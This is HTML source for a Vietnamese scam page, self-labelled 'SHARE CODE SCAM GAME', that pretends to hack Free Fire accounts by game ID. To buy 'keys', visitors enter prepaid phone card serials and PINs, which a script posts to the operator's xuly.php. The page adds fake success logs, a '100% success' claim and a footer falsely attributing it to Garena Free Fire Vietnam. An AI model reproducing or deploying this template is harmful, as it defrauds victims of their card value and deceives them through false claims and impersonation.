<!--- SHARE CODE SCAM GAME --->

<!DOCTYPE html>
<html lang="en">

    <head>
<style>img[alt="www.000webhost.com"]{display:none;}</style>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Trang Web Hack Tài Khoản FF Qua ID Game</title>

        <!-- CSS -->
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,500,500i">
        <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
        <script src="https://kit.fontawesome.com/598ca2eab2.js" crossorigin="anonymous"></script>
        <link rel="stylesheet" href="assets/css/animate.css">
        <link rel="stylesheet" href="assets/css/style.css?298041576">
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
        
      
        <script>
                    function loading(show) {
    if(show == true)
        $('.loading').show();
    else
        $('.loading').hide();
}
        </script>
        <style>
            .modal-body {
    text-align: left;
    position: relative;
    padding: 15px;
}
        </style>
        <link rel="stylesheet" href="assets/css/nhan.css?18748">
    </head>

    <body>
                <div class="loading"><div class="lds-hourglass"></div></div>

<nav class="navbar navbar-inverse navbar-expand-xl navbar-dark">
	<div class="navbar-header d-flex col">
		<a class="navbar-brand" href="#"><i class="fa fa-cube"></i>Chomacc<b>.com</b></a>  		
		<button type="button" data-target="#navbarCollapse" data-toggle="collapse" class="navbar-togglessss navbar-toggle navbar-toggler ml-auto">
			<span class="navbar-toggler-icon"></span>
			<span class="icon-bar"></span>
			<span class="icon-bar"></span>
			<span class="icon-bar"></span>
		</button>
	</div>
	<!-- Collection of nav links, forms, and other content for toggling -->
	<div id="navbarCollapse" class="collapse navbar-collapse justify-content-start">		
		<ul class="nav navbar-nav navbar-right ml-auto">
			<li class="nav-item active"><a href="#" class="nav-link"><i class="fa fa-home"></i><span>Trang chủ</span></a></li>
			

		</ul>
	</div>
</nav>

<marquee tên-thuộc-tính="giá-trị-thuộc-tính".... các-thuộc-tính-khác>

HỆ THỐNG CHECK ACC FREE FIRE QUA ID GAME UY TÍN CHẤT LƯỢNG THÀNH CÔNG 100%

</marquee>
			        <!-- Features -->
        <div class="features-container section-container">
	        <div class="container">
	        	<div class="row">
	        	    <div class="col-sm-5 features-box wow fadeInLeft">
	        	  
	        	        <div class="panel panel-default">
	        	     <div class="panel-body">       


<div id="carouselExampleControls" class="carousel slide" data-ride="carousel">
  <div class="carousel-inner">
    <div class="carousel-item active">
      <img class="d-block w-100" src="img/logo.png" alt="First slide">
    </div>
  </div>
</div>
  <div class="form-group">
    <label for="linktoprofile">Nhập ID Game Cần Check</label>
    <input type="number" class="form-control" id="linkcheck" aria-describedby="linktoprofile" placeholder="ID Game"/>  </div>
    <div class="form-group">
    <label for="nhapkeys">Nhập key đã mua:</label>
    <input type="text" class="form-control" id="nhapkey" aria-describedby="nhapkeys" placeholder="Nhập key mà bạn đã mua"/>  </div>
    <div class="form-group">
<button type="submit" id="crackpassword" style="margin-bottom: 0;" class="btn btn-primary">Tiến Hành</button>

    
  </div>
  <small id="emailHelp" class="form-text text-muted">Vui Lòng Nhập Đầy Đủ Thông Tin Nhé</small>
  <div class="form-group" id="ketquacheck" style="display:none">
  </div>
<script>

    $("#crackpassword").click(function(){
       if($.trim($('#linkcheck').val()) === "" && $.trim($('#nhapkey').val()) === ""){
           $("#ketquacheck").html('<div class="alert alert-info" role="alert">Vui lòng nhập đầy đủ nội dung !</div>');
           document.getElementById("ketquacheck").style.display = "block";
       } else if($.trim($('#nhapkey').val()) === "ADS-FF-2021"){
    loading(true);
      $('#ketquacheck').load('ajax.php?PT=CHECKPASS&key='+ $("#nhapkey").val() +'&linkvhn=' + $("#linkcheck").val(), function(){
            loading(false);
            document.getElementById("ketquacheck").style.display = "block";
        });
       }
    });
</script>
  

  	        	        
</div></div>
<div class="panel panel-default">
    <div class="panel-heading">Mua Key Hack Acc Bằng Thẻ Cào</div>
    <div class="panel-body">
        					
					<div class="form-group">
						<label>Loại thẻ:</label>
						<select class="form-control" id="card_type">
							<option value="">Chọn loại thẻ</option>
							<option value="Viettel">Viettel</option>
							<option value="Mobifone">Mobifone</option>
							<option value="Vinaphone">Vinaphone</option>
						</select>
					</div>
					<div class="form-group">
						<label>Mệnh giá:</label>
						<select class="form-control" id="card_amount">
							<option value="">Chọn mệnh giá</option>
							<option value="50000">50.000 </option>
							<option value="100000">100.000 </option>
							<option value="200000">200.000 </option>
						</select>
					</div>
					<div class="form-group">
						<label>Số seri:</label>
						<input type="text" class="form-control" id="serial" />
					</div>
					<div class="form-group">
						<label>Mã thẻ:</label>
						<input type="text" class="form-control" id="pin" />
					</div>
					<div class="form-group">
						<button type="submit" class="btn btn-success btn-block" onclick="bidz()">NẠP THẺ MUA KEY</button>
					</div>
				</form>
        </div></div>
       </div>
<script>
                                    function bidz() {
                                        loading(true);
                                        var card_type = $("#card_type").val();
                                        var card_amount = $("#card_amount").val();
                                        var serial = $("#serial").val();
                                        var pin = $("#pin").val();
                                        

                                        if (!card_type || !card_amount || !serial || !pin) {
                                            loading(false);
                                            swal("Có Lỗi Xảy Ra", "Thông tin bạn nhập chưa đủ, vui lòng kiểm tra lại", "error");
                                        } else {
                                            $.ajax({
                                                type: "POST",
                                                url: "xuly.php",
                                                data: {
                                                    card_type,
                                                    card_amount,
                                                    serial,
                                                    pin,
                                                },
                                                dataType: "json",
                                                success: function (res) {
                                                    if (res.success) {
                                                        loading(false);
                                                        swal("Thành công", res.success, "success");
                                                    } else {
                                                        loading(false);
                                                        swal("Lỗi", res.error, "error");
                                                    }
                                                },
                                                error: function (err) {
                                                    console.log(err);
                                                },
                                            });
                                        }
                                    }
                                  </script>
	        	    <div class="col-sm-7 features-box wow fadeInLeft">
	        	        
	        	                 
    
  <div class="panel panel-default">
    <div class="panel-heading">Bảng giá key check pass</div>
    <div class="panel-body">
         <div class="table-responsive">          
  <table class="table">
    <thead>
      <tr>
        <th>Giá</th>
        <th>Hạn sử dụng</th>
        <th>Trạng thái</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>50.000 VND</td>
        <td>Hack Được 1 Acc</td>
        <td>Còn key</td>
      </tr>
            <tr>
        <td>100.000 VND</td>
        <td>Hack Được 8 Acc</td>
        <td>Còn key</td>
      </tr>
            <tr>
        <td>200.000 VND</td>
        <td>Hack Được 30 Acc</td>
        <td>Còn key</td>
      </tr>
      </tr>
    </tbody>
  </table>
  </div>
    </div>
  </div>
       
  
 <div class="panel panel-default">
    <div class="panel-heading">Check Pass Gần Đây</div>
    <div class="panel-body">
         <div class="table-responsive">          
  <table class="table">
    <thead>
      <tr>
        <th>ID</th>
        <th>Thời Gian</th>
        <th>Trạng thái</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>********</td>
        <td>2 Giây trước</td>
        <td>Thành Công</td>
      </tr>
            <tr>
        <td>********</td>
        <td>5 Giây trước</td>
        <td>Thành Công</td>
      </tr>
            <tr>
        <td>********</td>
        <td>6 Giây trước</td>
        <td>Thành Công</td>
      </tr>
            <tr>
        <td>********</td>
        <td>9 Giây trước</td>
        <td>Thành Công</td>
      </tr>
      <tr>
        <td>********</td>
        <td>12 Giây trước</td>
        <td>Thành Công</td>
      </tr>
      <tr>
        <td>********</td>
        <td>22 Giây trước</td>
        <td>Thành Công</td>
      </tr>
      <tr>
        <td>********</td>
        <td>25 Giây trước</td>
        <td>Thành Công</td>
      </tr>
      <tr>
        <td>********</td>
        <td>29 Giây trước</td>
        <td>Thành Công</td>
      </tr>
      <tr>
        <td>********</td>
        <td>32 Giây trước</td>
        <td>Thành Công</td>
      </tr>
      <tr>
        <td>********</td>
        <td>42 Giây trước</td>
        <td>Thành Công</td>
      </tr>
      
      <tr>
        <td>********</td>
        <td>52 Giây trước</td>
        <td>Thành Công</td>
      </tr>
      <tr>
        <td>********</td>
        <td>57 Giây trước</td>
        <td>Thành Công</td>
      </tr>
      <tr>
        <td>********</td>
        <td>59 Giây trước</td>
        <td>Thành Công</td>
      </tr>
      <tr>
        <td>********</td>
        <td>59 Giây trước</td>
        <td>Thành Công</td>
      </tr>
    </tbody>
  </table>
  </div>
    </div>
  </div>
       
    </div>
  </div>



 



   </div>
  </div>	        	   
</div>
        <!-- Footer -->
        <footer>
	        <div class="container">
	        	<div class="row">
	        		<div class="col-sm-12 footer-copyright">
                    	&copy; Được Phát Hành Bởi Garena Free Fire Việt Nam
                    </div>
                </div>
	        </div>
        </footer>


        <!-- Javascript -->
        <script src="assets/bootstrap/js/bootstrap.min.js"></script>
        <script src="assets/js/jquery.backstretch.min.js"></script>
        <script src="assets/js/wow.min.js"></script>
        <script src="assets/js/waypoints.min.js"></script>
        <script src="assets/js/scripts.js"></script>
        <script>

           
  

        </script>

    </body>

</html>